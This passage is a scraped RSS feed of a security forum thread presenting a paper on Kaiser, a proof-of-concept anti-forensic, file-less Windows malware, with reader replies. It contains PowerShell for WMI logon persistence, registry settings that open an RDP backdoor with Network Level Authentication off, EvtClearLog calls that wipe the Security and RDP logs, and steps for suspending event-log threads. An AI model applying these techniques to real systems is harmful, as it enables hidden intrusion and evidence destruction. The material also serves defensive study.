This report aimed to show an example subset of file-less and anti-forenisic attacks that can be used by a malicious threat to evade detection and forensic analysis. The eaxmples demonstrated by Kaiser include file-less WMI persistence, backdoor access and execution of third-party applications as well as anti-forensic methods of destroying or disabling sources of forensic evidence such as the event logging service and memory-resident artefacts. These tactics can be abused by sophisticated adversaries to attack systems while minimising risk of being detected and/or traced to avoid any meaningful result from a forensic investigation.

----

# 5 References

1. Microsoft, Fileless threats, https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/fileless-threats
2. Microsoft, Windows Management Instrumentation, https://docs.microsoft.com/en-us/windows/desktop/wmisdk/wmi-start-page
3. Microsoft, Win32_Process class, https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/win32-process
4. Microsoft, Create method of the Win32_Process class, https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/create-method-in-class-win32-process
5. Microsoft, Determining the Type of Event to Receive, https://docs.microsoft.com/en-us/windows/desktop/wmisdk/determining-the-type-of-event-to-receive
6. Microsoft, Creating an Event Filter, https://docs.microsoft.com/en-us/windows/desktop/wmisdk/creating-an-event-filter
7. Microsoft, Win32_LoggedOnUser, https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/win32-loggedonuser
8. Microsoft, __EventConsumer, https://docs.microsoft.com/en-us/windows/desktop/wmisdk/--eventconsumer
9. Microsoft, CommandLineEventConsumer, https://docs.microsoft.com/en-us/windows/desktop/wmisdk/commandlineeventconsumer
10. Microsoft, __FilterToConsumerBinding, https://docs.microsoft.com/en-us/windows/desktop/wmisdk/--filtertoconsumerbinding
11. Microsoft, Peering Inside the PE https://msdn.microsoft.com/en-au/library/ms809762.aspx
12. ReactOS, IMAGE_BASE_RELOCATION, https://doxygen.reactos.org/d5/d44/ntimage_8h_source.html#l00162
13. ReactOS, LdrRelocateImageWithBias, https://doxygen.reactos.org/df/da2/sdk_2lib_2rtl_2image_8c.html#a61fae0253935550115acc7751e6d6073
14. ReactOS, LdrProcessRelocationBlockLongLong, https://doxygen.reactos.org/df/da2/sdk_2lib_2rtl_2image_8c.html#a79a460be03d9da50f71d427b26238496
15. ReactOS, IMAGE_IMPORT_DESCRIPTOR, https://doxygen.reactos.org/d5/d44/ntimage_8h_source.html#l00572
16. ReactOS, IMAGE_THUNK_DATA, https://doxygen.reactos.org/d5/d44/ntimage_8h_source.html#l00510
17. ReactOS, IMAGE_IMPORT_BY_NAME, https://doxygen.reactos.org/dd/d43/pedump_8c_source.html#l00328
18. Iczelion, Tutorial 6: Import Table, http://win32assembly.programminghorizon.com/pe-tut6.html
19. Forensics Wiki, Anti-forensics, https://www.forensicswiki.org/wiki/Anti-forensic_techniques
20. MITRE ATT&amp;CK&lt;sup&gt;TM&lt;/sup&gt;, Defense Evasion, https://attack.mitre.org/tactics/TA0005/
21. Microsoft, Event Logging, https://docs.microsoft.com/en-us/windows/desktop/eventlog/event-logging
22. Microsoft, EvtClearLog, https://docs.microsoft.com/en-us/windows/desktop/api/winevt/nf-winevt-evtclearlog
23. Phant0m: Killing Windows Event Log, https://artofpwn.com/phant0m-killing-windows-event-log.html
24. HOWTO: Use I_QueryTagInformation, https://wj32.org/wp/2010/03/30/howto-use-i_querytaginformation/
25. GitHub, Mimikatz Event log, https://github.com/gentilkiwi/mimikatz/blob/110a831ebe7b529c5dd3010f9e7fced0d3e3a46c/mimikatz/modules/kuhl_m_event.c
26. Microsoft, IWbemServices, interface https://docs.microsoft.com/en-us/windows/desktop/api/wbemcli/nn-wbemcli-iwbemservices
27. NTAPI Undocumented Functions, NtRaiseHardError, https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtRaiseHardError.
28. GitHub, Invoke-ReflectivePEInjection.ps1, https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1#L662
29. Microsoft, STARTUPINFOA, https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/ns-processthreadsapi-_startupinfoa

----

Thanks for reading! Hope you learned something or just generally enjoyed it! Source can be found on my GitHub here: https://github.com/NtRaiseHardError/Kaiser

-- _dtm_</description>
    
    <lastBuildDate>Fri, 14 Dec 2018 12:28:47 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Anti-forensic and File-less Malware</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008/6</link>
        <pubDate>Sat, 05 Jan 2019 07:58:57 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10008-6</guid>
        <source url="https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008.rss">Anti-forensic and File-less Malware</source>
      </item>
      <item>
        <title>Anti-forensic and File-less Malware</title>
        <dc:creator><![CDATA[eugenelee]]></dc:creator>
        <description><![CDATA[
            <p>Thank you for your report.<br>
Cool!<br>
I wanna know about linux things.<br>
Bye~.~</p>
          <p><a href="https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008/5</link>
        <pubDate>Fri, 14 Dec 2018 12:28:47 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10008-5</guid>
        <source url="https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008.rss">Anti-forensic and File-less Malware</source>
      </item>
      <item>
        <title>Anti-forensic and File-less Malware</title>
        <dc:creator><![CDATA[mirage]]></dc:creator>
        <description><![CDATA[
            <p>thanks for this paper.thanks for spending your time on this.</p>
          <p><a href="https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008/4</link>
        <pubDate>Thu, 13 Dec 2018 19:17:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10008-4</guid>
        <source url="https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008.rss">Anti-forensic and File-less Malware</source>
      </item>
      <item>
        <title>Anti-forensic and File-less Malware</title>
        <dc:creator><![CDATA[occupi]]></dc:creator>
        <description><![CDATA[
            <p>I really like how you broke down each section and showed both code/disassembly and examples. Very informative, very good paper. Wrapping it up by showing off Kaiser (and how Kaiser implements all these things) was a great way to conclude. Thank you!</p>
          <p><a href="https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008/3</link>
        <pubDate>Fri, 07 Dec 2018 19:36:54 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10008-3</guid>
        <source url="https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008.rss">Anti-forensic and File-less Malware</source>
      </item>
      <item>
        <title>Anti-forensic and File-less Malware</title>
        <dc:creator><![CDATA[jl3]]></dc:creator>
        <description><![CDATA[
            <p>Damn this is very well written, thanks for spending your time on this!</p>
          <p><a href="https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008/2</link>
        <pubDate>Thu, 06 Dec 2018 09:15:53 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-10008-2</guid>
        <source url="https://0x00sec.org/t/anti-forensic-and-file-less-malware/10008.rss">Anti-forensic and File-less Malware</source>
      </item>
      <item>
        <title>Anti-forensic and File-less Malware</title>
        <dc:creator><![CDATA[dtm]]></dc:creator>
        <description><![CDATA[
            <h1>Anti-forensic and File-less Malware</h1>
<h3>Recommended Pre-requisites</h3>
<ul>
<li>C programming language</li>
<li>PowerShell scripting language</li>
<li>Intel x86 assembly language</li>
<li>Windows API</li>
<li>Windows Internals</li>
<li>PE file format</li>
</ul>
<h2>Contents</h2>
<ol>
<li><a href="https://0x00sec.org#1-introduction">Introduction</a></li>
<li>
<a href="https://0x00sec.org#2-fundamental-concepts">Fundamental Concepts</a>
<ul>
<li>2.1 <a href="https://0x00sec.org#21-file-less-techniques">File-less Techniques</a>
<ul>
<li>2.1.1 <a href="https://0x00sec.org#211-persistence">Persistence</a>
</li>
<li>2.1.2 <a href="https://0x00sec.org#212-process-hollowing">Process Hollowing</a>
</li>
<li>2.1.3 <a href="https://0x00sec.org#213-reflective-dll-injection">Reflective DLL Injection</a>
</li>
<li>2.1.4 <a href="https://0x00sec.org#214-backdoor">Backdoor</a>
</li>
</ul>
</li>
<li>2.2 <a href="https://0x00sec.org#22-anti-forensic-techniques">Anti-forensic Techniques</a>
<ul>
<li>2.2.1 <a href="https://0x00sec.org#221-disabling-event-logging">Disabling Event Logging</a>
<ul>
<li>2.2.1.1 <a href="https://0x00sec.org#2211-suspending-event-logging-threads">Suspending Event Logging Threads</a>
</li>
<li>2.2.1.2 <a href="https://0x00sec.org#2212-patching-the-event-logging-module">Patching the Event Logging Module</a>
</li>
</ul>
</li>
<li>2.2.2 <a href="https://0x00sec.org#222-forensic-analysis-prevention">Forensic Analysis Prevention</a>
<ul>
<li>2.2.2.1 <a href="https://0x00sec.org#2221-uninstalling-persistence">Uninstalling Persistence</a>
</li>
<li>2.2.2.2 <a href="https://0x00sec.org#2222-wiping-event-logs">Wiping Event Logs</a>
</li>
<li>2.2.2.3 <a href="https://0x00sec.org#2223-removing-memory-artefacts">Removing Memory Artefacts</a>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<a href="https://0x00sec.org#3-kaiser">Kaiser</a>
<ul>
<li>3.1 <a href="https://0x00sec.org#31-persistence-mechanism">Persistence Mechanism</a>
</li>
<li>3.2 <a href="https://0x00sec.org#32-process-hollowed-and-networked-interactive-sessions">Process-hollowed and Networked Interactive Sessions</a>
</li>
<li>3.3 <a href="https://0x00sec.org#33-active-forensic-analysis-prevention">Active Forensic Analysis Prevention</a>
</li>
<li>3.4 <a href="https://0x00sec.org#34-further-improvements">Further Improvements</a>
</li>
</ul>
</li>
<li><a href="https://0x00sec.org#4-conclusion">Conclusion</a></li>
<li><a href="https://0x00sec.org#5-references">References</a></li>
</ol>
<h2>1 Introduction</h2>
<p>One of the most advantageous attributes for a malware to have is survival as a means to maintain persistence and to evade detection by security solutions. Since developing a full-blown piece of malware requires expensive resources, this trait becomes increasingly desireable to continuously remain unknown and undetected.</p>
<p>A property of such malware should include anti-forensic capabilities in its kit such that its footprint is minimal as well as tampering with with system and forensic evidence to prevent its capture and analysis. Coupled with file-less techniques, sophisticated malware may have the ability to attack a system while being evasive by avoiding traditional methods where detection has been developed and matured over the past years.</p>
<p>The proof-of-concept malware, Kaiser, was developed to demonstrate an example subset of anti-forensic and file-less functionalities. Such functionalities include file-less persistence and execution of binaries, and anti-forensic countermeasures that disable the event logging service and active prevention of forensic analysis of the infected machine and itself to deny any further investigation into the intrusion.</p>
<hr>
<h1>2 Fundamental Concepts</h1>
<p>This section discusses the necessary background information for the example subset of anti-forensic and file-less capabilities implemented into Kaiser.</p>
<h2>2.1 File-less Techniques</h2>
<p>Currently, there is no official and universal definition of the term file-less so the one given by Microsofts "Fileless threats"<sup><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/fileless-threats">1</a></sup> will be used for the scope of this paper. Microsoft defines three types of file-less:</p>
<ol>
<li>
<p>Type I: No file activity is performed - this describes threats that never touches the disk. Such examples can leverage the use of an exploit to attack a system by injecting directly into memory. This type of threat is classified as highly sophisticated, uncommon, impractical, and unreliable despite it being incredibly dangerous.</p>
</li>
<li>
<p>Type II: Indirect file activity - this describes threats that do not traditionally write to the file system. An example of this may leverage the Windows Management Instrumentation (WMI) to install a persistence mechanism that executes a command to perform a malicious activity. Microsoft state that the WMI repository exists as a physical file and as such, the installed threat indirectly uses disk. Since it is a multi-purpose data container, detection and removal of embedded malicious data is non-trivial.</p>
</li>
<li>
<p>Type III: Files required to operate - this describes threats that utilise files for execution and injection operations such as using executables, DLLs, LNK files or scheduled tasks as well as malicious macro documents.</p>
</li>
</ol>

<p>The following functionality delves into types II and III to deliver persistence and execution of applications file-lessly.</p>
<h3>2.1.1 Persistence</h3>
<p>The WMI is "the infrastructure for management data and operations on Windows-based systems."<sup><a href="https://docs.microsoft.com/en-us/windows/desktop/wmisdk/wmi-start-page">2</a></sup> It provides methods for storing and querying data as well as providing methods to execute operations, each categorised under their own appropriate classes where each class lives under their respective namespace. For example, the <em>Win32_Process</em><sup><a href="https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/win32-process">3</a></sup> class contains data on existing processes such as the command line, executable path, name, and process ID that can be queried. It also provides the <em>Create</em><sup><a href="https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/create-method-in-class-win32-process">4</a></sup> method to spawn new processes.</p>
<p>In addition to storing data, the WMI includes a notification system that can be triggered on specific events of which there are two types: intrinsic and extrinsic.<sup><a href="https://docs.microsoft.com/en-us/windows/desktop/wmisdk/determining-the-type-of-event-to-receive">5</a></sup> Intrinsic events occur when there is a change internal to the WMI, that is, any modifications to classes, objects or namespaces. In contrast, extrinsic events happen when there is a change external to the WMI such as on process, module or thread start, or registry changes.</p>
<p>An event filter is described as the conditions under which the WMI fires an event.<sup><a href="https://docs.microsoft.com/en-us/windows/desktop/wmisdk/creating-an-event-filter">6</a></sup> They can be generated by specifying a filter query which indicates on which event it should be triggered. In the case of restart persistence, it may be desired to set an event filter to be fired when the user logs onto the system, that is, in the event of the instance creation of a <em>Win32_LoggedOnUser</em><sup><a href="https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/win32-loggedonuser">7</a></sup> class. The following PowerShell code demonstrates this example:</p>
<pre><code class="lang-auto">$query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"
$evtFilter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "FilterName";
    EventNamespace = "root\cimv2";
    QueryLanguage = "WQL";
    Query = $query;
}
</code></pre>
<p>The event filter can be used to deliver a consumer which can take action upon the event trigger. To perform an action, an <em>__EventConsumer</em><sup><a href="https://docs.microsoft.com/en-us/windows/desktop/wmisdk/--eventconsumer">8</a></sup> can be created. The <em>CommandLineEventConsumer</em><sup><a href="https://docs.microsoft.com/en-us/windows/desktop/wmisdk/commandlineeventconsumer">9</a></sup> class is a specific <em>__EventConsumer</em> which can execute an arbitrary command on the command line by defining its <em>CommandLineTemplate</em> argument. The following PowerShell code demonstrates this example:</p>
<pre><code class="lang-auto">$cmd = powershell.exe C:\Path\To\Script.ps1
$evtConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "ConsumerName";
    CommandLineTemplate = $cmd
}
</code></pre>
<p>Finally, to combine the event filter with its consumer, the <em>__FilterToConsumerBinding</em><sup><a href="https://docs.microsoft.com/en-us/windows/desktop/wmisdk/--filtertoconsumerbinding">10</a></sup> class can be used. The folllowing PowerShell code deomstrates this example:</p>
<pre><code class="lang-auto">Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $evtFilter;
    Consumer = $evtConsumer
}
</code></pre>
<p>Upon the creation and registration of these three classes instances, whenever a user logs into a system, it will trigger the event filter and the consumer will activate the execution of the PowerShell script. To transform this into type II file-less, the defined PowerShell script can be made redundant by translating its contents into the command line.</p>
<h3>2.1.2 Process Hollowing</h3>
<p>Third-party applications can be file-lessly executed directly from memory. The <em>process hollowing</em> technique describes an example of how this can be done by manually emulating the user-mode procedure carried out by the Windows image loader when a PE file is called to execute. The following steps describe an example of how this can be performed:</p>
<ol>
<li>Read the raw bytes of the desired PE file</li>
<li>Verify the PE file format</li>
<li>Create a suspended process</li>
<li>Unmap the suspended processs executable image</li>
<li>Map the bytes of the PE file into the process</li>
<li>Set the entry point to the PE files entry point</li>
<li>Resume the process</li>
</ol>
<p>Mapping the PE file is relatively straight-forward for process hollowing as it will automatically initialise all the necessary objects in memory such as DLLs and the executable images import values.</p>
<pre><code class="lang-auto">Mapping PE file

                                 Disk                            Memory
                           
                                             ,+------------ +---------------+ ---  ImageBase
                                            /               |    Headers    |    SizeOfHeaders
                                          /   ,+----------- +---------------+ ---  VirtualAddress
                        --- +------------+   /              |               |
            SizeofHeaders   |   Headers  | /                |     .text     |    VirtualSize
      PointerToRawData  --- +------------+                  |               |
            SizeOfRawData   |   .text    | ,+-------------- +---------------+ ---  VirtualAddress
      PointerToRawData  --- +------------+                  |               |
            SizeOfRawData   |   .data    |                  |     .data     |    VirtualSize
      PointerToRawData  --- +------------+                  |               |
            SizeOfRawData   |    ...     | `+-------------- +---------------+ ---  VirtualAddress
                        --- +------------+                  |               |
                                          \                 |      ...      |    VirtualSize
                                            \               |               |
                                             `+------------ +---------------+ ---
</code></pre>
<p>As shown in the above figure, the PE file on disk must be expanded to fill each of its sections in memory described by their size members. The header of the PE file remains the same size and starts at the <code>ImageBase</code> but each section must be translated to its correct virtual offset and pad up to its <code>VirtualSize</code> rather than its <code>SizeOfRawData</code>.</p>
<p>The desired PE files bytes can be stored in memory which will be used to replace it in memory making it file-less. Since this uses a file from disk, it is considered a type III file-less technique.</p>
<h3>2.1.3 Reflective DLL Injection</h3>
<p><em>Reflective DLL Injection</em> uses a similar method to <em>process hollowing</em> but it requires further preparations as is not automatically initialised as before. After mapping the PE file (that follows the same procedure as process hollowing), the relocations and imports must be manually updated to contain the correct values.</p>
<h4>Fixing Relocations</h4>
<p>In the case where the DLL is not loaded into its desired base address, the relocations need to be parsed such that the references in the code to other sections are accurate. This is due to the assumption that the linker makes about the image base when mapped into memory.<sup><a href="https://msdn.microsoft.com/en-au/library/ms809762.aspx">11</a></sup> The relocation table, if present, can be found in the <code>.reloc</code> section which contains an array of <code>IMAGE_BASE_RELOCATION</code> structures, each followed by <code>WORD TypeOffset</code> values that contain both the type of relocation and the offset. The structure is defined<sup><a href="https://doxygen.reactos.org/d5/d44/ntimage_8h_source.html#l00162">12</a></sup> like so:</p>
<pre><code class="lang-auto">typedef struct _IMAGE_BASE_RELOCATION {
    DWORD   VirtualAddress;
    DWORD   SizeOfBlock;
} IMAGE_BASE_RELOCATION, *PIMAGE_BASE_RELOCATION;
</code></pre>
<p>The <code>VirtualAddress</code> is the starting RVA for the following block of relocations and the <code>SizeOfBlock</code> is the size of the entire block including both the <code>IMAGE_BASE_RELOCATION</code> structure and the <code>TypeOffset</code> relocations. For each <code>TypeOffset</code> value, the top 4 bits detail the type of relocation and the bottom 12 bits is the offset from the <code>VirtualAddress</code> RVA. An example:</p>
<pre><code class="lang-auto">VirtualAddress: 0x00001000; SizeOfBlock: 0x0000000C
TypeOffset: 0x300C
TypeOffset: 0x3010
</code></pre>
<p>Both <code>TypeOffset</code>s are a <code>IMAGE_REL_BASED_HIGHLOW</code> relocation type as indicated by the value of <code>3</code>. The first offset is at <code>0xC</code> and the second is at <code>0x10</code>. Assume that the DLL was loaded into <code>0x01000000</code> and its <code>ImageBase</code> is <code>0x00400000</code>. The relocation would be calculated and corrected as follows<sup><a href="https://doxygen.reactos.org/df/da2/sdk_2lib_2rtl_2image_8c.html#a61fae0253935550115acc7751e6d6073">13</a> <a href="https://doxygen.reactos.org/df/da2/sdk_2lib_2rtl_2image_8c.html#a79a460be03d9da50f71d427b26238496">14</a></sup>:</p>
<pre><code class="lang-auto">// Linker-assumed desired base address, obtained from IMAGE_OPTIONAL_HEADER.ImageBase.
DWORD ImageBase = 0x00400000;
// Starting RVA of relocation block, obtained from IMAGE_RELOCATION_BLOCK.VirtualAddress.
ULONG VirtualAddress = 0x00001000;
// Base address where DLL was actually loaded.
PVOID BaseAddress = 0x01000000;
// Starting address of relocation block.
ULONG_PTR Address = (ULONG_PTR)BaseAddress + (ULONG_PTR)VirtualAddress;
// Difference between the base address and ImageBase.
LONGLONG Delta = (ULONG_PTR)BaseAddress - ImageBase; // = 0x00C00000

PULONG LongPtr = NULL;
SHORT Offset = 0;

// Calculate the first relocation.
USHORT TypeOffset1 = 0x300C;
// Get the offset from VirtualAddress.
Offset = TypeOffset1 &amp; 0xFFF;
LongPtr = (PULONG)(Address + Offset);
// Correct the value of the first relocation.
*LongPtr += Delta;

// Calculate the second relocation.
USHORT TypeOffset2 = 0x3010;
// Get the offset from VirtualAddress.
Offset = TypeOffset2 &amp; 0xFFF;
LongPtr = (PULONG)(Address + Offset);
// Correct the value of the second relocation.
*LongPtr += Delta;
</code></pre>
<p>Note: The <code>IMAGE_REL_BASED_HIGHLOW</code> relocation type alone is sufficient for the scope of this paper.</p>
<h4>Fixing Import Table</h4>
<p>The import table consists of functions that rely on external shared libraries to provide extended functionality to the application on runtime, especially for Windows API routines that are exported by common DLLs <code>ntdll.dll</code> and <code>kernel32.dll</code>. When an executable is loaded into memory, the table must be initialised with the correct addresses of where the exported functions exist in memory so that it can be referenced and used.</p>
<p>Walking the import table first requires the identification of the <code>IMAGE_IMPORT_DESCRIPTOR</code> struct which is defined<sup><a href="https://doxygen.reactos.org/d5/d44/ntimage_8h_source.html#l00572">15</a></sup> as:</p>
<pre><code class="lang-auto">typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        ULONG Characteristics;
        ULONG OriginalFirstThunk;
    } DUMMYUNIONNAME;
    ULONG TimeDateStamp;
    ULONG ForwarderChain;
    ULONG Name;
    ULONG FirstThunk;
} IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;
</code></pre>
<p>The important members of this structure are <code>OriginalFirstThunk</code>, <code>Name</code> and <code>FirstThunk</code>. The <code>Name</code> member points to the ASCIIZ string of the DLL that provides the exported routines for this set of imports. Both <code>OriginalFirstThunk</code> and <code>FirstThunk</code> point to an <code>IMAGE_THUNK_DATA</code> struct which are both identical on disk as a raw executable file. It is defined<sup><a href="https://doxygen.reactos.org/d5/d44/ntimage_8h_source.html#l00510">16</a></sup> as:</p>
<pre><code class="lang-auto">typedef struct _IMAGE_THUNK_DATA32 {
    union {
        ULONG ForwarderString;
        ULONG Function;
        ULONG Ordinal;
        ULONG AddressOfData;
    } u1;
} IMAGE_THUNK_DATA32, *PIMAGE_THUNK_DATA32;
</code></pre>
<p>This structure can either be interpreted as either of the four union members and the <code>IMAGE_IMPORT_BY_NAME</code> struct which is defined<sup><a href="https://doxygen.reactos.org/dd/d43/pedump_8c_source.html#l00328">17</a></sup> as:</p>
<pre><code class="lang-auto">typedef struct _IMAGE_IMPORT_BY_NAME {
    WORD Hint;
    BYTE Name[1];
} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;
</code></pre>
<p>When the executable is mapped into memory and the import table is being initialised, it will traverse the <code>FirstThunk</code> array of <code>IMAGE_THUNK_DATA</code> structures and replace them with the address of its function in memory. To locate the function, the <code>IMAGE_THUNK_DATA.Ordinal</code> will be checked with a bitwise-and operation against the most significant bit, that is, <code>IMAGE_THUNK_DATA.Ordinal &amp; 0x80000000</code>. If it is set, the ordinal will be the lower 16-bits of the value and the function can be located using it as the offset in the DLLs ordinal table. For example, if the <code>Ordinal</code> value is <code>0x8000013D</code>, the ordinal value will be <code>0x13D</code>. Otherwise, the function is found by name by following into the <code>IMAGE_IMPORT_BY_NAME</code> struct and using its <code>Name</code> member.  The <code>Hint</code> can be used as an offset into the DLLs exported name table to find the address of the exported function but also requires a check to test if the function name matches however it is optional and some linkers do not set this value. Once the address of the function has been found, it will replace the <code>FirstThunk</code>'s <code>IMAGE_THUNK_DATA</code>'s structure with the address while leaving the <code>OriginalFirstThunk</code>'s intact.<sup><a href="http://win32assembly.programminghorizon.com/pe-tut6.html">18</a></sup></p>
<h3>2.1.4 Backdoor</h3>
<p>Achieving a type III file-less backdoor is possible by using a technique known as <em>Living off the Land</em> (LOL) that describes the usage of an existing executable on the system to perform an action. This removes the need for malware to import their own or drop additional tools onto the machine making it inherently file-less but can also serve as a contingency. Windows natively comes packaged with <em>Remote Desktop Protocol</em> (RDP) that enables access to the system from a remote machine over the network however, it may be disabled. A few settings may need to be reconfigured to enable it:</p>
<ul>
<li>Registry value <code>fDenyTSConnections</code> under the key <code>HKLM\System\CurrentControlSet\Control\Terminal Server</code> should be set to <code>0</code> to allow connections</li>
<li>Registry value <code>UserAuthentication</code> under the key <code>HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</code> should be set to <code>0</code> to disable Network Level Authentication</li>
<li>Windows Firewall should allow inbound TCP connections on port 3389</li>
</ul>
<hr>
<h2>2.2 Anti-forensic Techniques</h2>
<p>Forensics Wiki defines <em>anti-forensics</em> as "Attempts to negatively affect the existence, amount and/or quality of evidence from a crime scene, or make the analysis and examination of evidence difficult or impossible to conduct"<sup><a href="https://www.forensicswiki.org/wiki/Anti-forensic_techniques">19</a></sup> whereas MITRE ATT&amp;CK<sup>TM</sup> uses the term <em>Defense Evasion</em> that is described as "techniques an adversary may use to evade detection or avoid other defenses."<sup><a href="https://attack.mitre.org/tactics/TA0005/">20</a></sup> The anti-forensic methods that will be discussed covers only a subset of anti-forensic methods that try to remove or hide evidence of the malwares operations, and therefore detection, alongside the ability to disrupt the capabilities of a forensic investigation and analysis. These include tampering with the event logging service and active meaures to prevent the proper analysis of both the system and malware.</p>
<h3>2.2.1 Disabling Event Logging</h3>
<p>Microsoft defines event logging as " a standard, centralized way for applications (and the operating system) to record important software and hardware events. The event logging service records events from various sources and stores them in a single collection called an event log."<sup><a href="https://docs.microsoft.com/en-us/windows/desktop/eventlog/event-logging">21</a></sup> Event logs may contain a wealth of information including, but not limited to, user logins, external device connections, process creation, remote desktop connections, file activity, and even remote thread creations. The event logging service is, like other Windows services, run as threads under an <em>svchost</em> process container. From a forensic standpoint, it is a valuable source from which certain activity can be detected or discovered via monitoring or recovered from a machine of interest. To deny event logging is to avoid inital detection from administration and, if necessary, the destruction of crucial evidence and proper analysis of the infected system. It is important to know that despite its effectiveness, it is suspicious when there are long delays in between log entries and even more so when the logs are empty. This is left for the operator to understand how this works and when it is appropriate and necessary to disable event logging.</p>
<p>Clearing event logs is trivial by using the Windows Event Log APIs <code>EvtClearLog</code><sup><a href="https://docs.microsoft.com/en-us/windows/desktop/api/winevt/nf-winevt-evtclearlog">22</a></sup> and specifying the <code>ChannelPath</code> to be deleted. For example, the following call clears the <em>Windows Logs</em> <em>Security</em> event log:</p>
<pre><code class="lang-auto">EvtClearLog(NULL, L"Security", NULL, 0);
</code></pre>
<p>It can also be used to clear <em>Applications and Services Logs</em> Operational logs. The following clears the <em>Terminal Services</em>s <em>Local Session Manager</em> that stores logs corresponding to Remote Desktop Protocol:</p>
<pre><code class="lang-auto">EvtClearLog(NULL, L"Microsoft-Windows-TerminalServices-LocalSessionManager/Operational", NULL, 0);
</code></pre>
<p>It should be noted that if the <em>Security</em> event log is cleared, a special event (ID 1102) will remain stating The audit log was cleared. Additionally, if the system was configured to forward logs to a remote server, clearing the event logs will be ineffective. There are two methods to defeat these mechanisms: suspending the event logging services threads and patching the event logging services module.</p>
<h4>2.2.1.1 Suspending Event Logging Threads</h4>
<p>Halil Dalabasmazs post <em>Phant0m: Killing Windows Event Log</em><sup><a href="https://artofpwn.com/phant0m-killing-windows-event-log.html">23</a></sup> informs of two ways to locate the event logging services threads: analysing the <code>SubProcessTag</code>s in the corresponding <em>svchost.exe</em> processs <em>Thread Environment Block</em> s (TEB) or walking thread stacks using debugging symbols. This paper only focusses on the former.</p>
<p>The goal of discovering the <code>SubProcessTag</code> is because it can be used to identify the service tag for a thread, in this case, it is used to identify the event logging services threads.<sup><a href="https://wj32.org/wp/2010/03/30/howto-use-i_querytaginformation/">24</a></sup> The <code>SubProcessTag</code> is found in the TEBs of the event logging services process which can be found by performing the following steps:</p>
<ol>
<li>Identify the event logging service process using <code>OpenService</code>
</li>
<li>Open the process using <code>OpenProcess</code>
</li>
<li>Iterate through the processs threads</li>
<li>For each thread, obtain the TEB address using <code>NtQueryInformationThread</code>
</li>
<li>Get the <code>SubProcessTag</code> value in the TEB struct using <code>ReadProcessMemory</code>
</li>
</ol>
<p>To check the threads service tag, the <code>I_QueryTagInformation</code> function is called with the <code>ServiceNameFromTagInformation</code> <code>SC_SERVICE_TAG_QUERY_TYPE</code> value which stores the tag information into a <code>SC_SERVICE_TAG_QUERY</code> struct type defined as:</p>
<pre><code class="lang-auto">typedef struct _SC_SERVICE_TAG_QUERY {
    ULONG ProcessId;
    ULONG ServiceTag;
    ULONG Unknown;
    PVOID Buffer;
} SC_SERVICE_TAG_QUERY, *PSC_SERVICE_TAG_QUERY;
</code></pre>
<p>The struct should be initialised as follows before calling <code>I_QueryTagInformation</code>:</p>
<pre><code class="lang-auto">SC_SERVICE_TAG_QUERY sstq;
sstq.ProcessId = (ULONG)dwProcessId;
sstq.ServiceTag = (ULONG)uServiceTag;
sstq.Unknown = 0;
sstq.Buffer = NULL;
</code></pre>
<p>where <code>dwProcessId</code> is the process ID of the service that contains the thread and the <code>uServiceTag</code> is the <code>SubProcessTag</code> value. On success, the <code>Buffer</code> member will contain the string of the service tag, that is, if querying for event logging threads, it will contain <code>"eventlog"</code>. After all of the the event logging threads have been identified, they can be opened using <code>OpenThread</code> with <code>THREAD_SUSPEND_RESUME</code> access rights and subsequently suspended or resumed.</p>
<h4>2.2.1.2 Patching the Event Logging Module</h4>
